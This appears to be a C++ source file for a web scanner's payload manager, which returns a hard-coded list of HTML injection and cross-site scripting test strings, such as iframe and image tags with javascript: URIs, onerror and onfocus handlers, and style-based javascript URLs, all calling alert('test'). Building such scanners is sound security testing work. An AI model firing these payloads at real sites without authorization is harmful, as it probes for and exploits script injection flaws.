#include "payload_manager.hpp"

PayloadManager::PayloadManager() {
    initializePayloads();
}

void PayloadManager::initializePayloads() {
    payloads = {
        // Basic elements
        "<div id=\"scanner-test\">Test</div>",
        "<span class=\"scanner-test\">Test</span>",
        // iframes
        "<iframe src=\"javascript:alert('test')\"></iframe>",
        "<iframe src=\"data:text/html,<script>alert('test')</script>\"></iframe>",
        // Images
        "<img src=\"x\" onerror=\"alert('test')\">",
        "<img src=\"javascript:alert('test')\">",
        // Text and font modifications
        "<font color=\"red\">Test</font>",
        "<marquee>Test</marquee>",
        "<b>Test</b><i>Test</i>",
        // Forms
        "<form action=\"javascript:alert('test')\"><input type=\"submit\"></form>",
        "<form><input type=\"text\" onfocus=\"alert('test')\"></form>",
        // Comments and scripts
        "<!--<script>alert('test')</script>-->",
        "<script>/* test */</script>",
        "<noscript>Test</noscript>",
        // Style-based
        "<style>body { background: url('javascript:alert(1)') }</style>",
        "<div style=\"background-image: url('javascript:alert(1)')\">Test</div>"
    };
}

std::vector<std::string> PayloadManager::getPayloads() {
    return payloads;
}
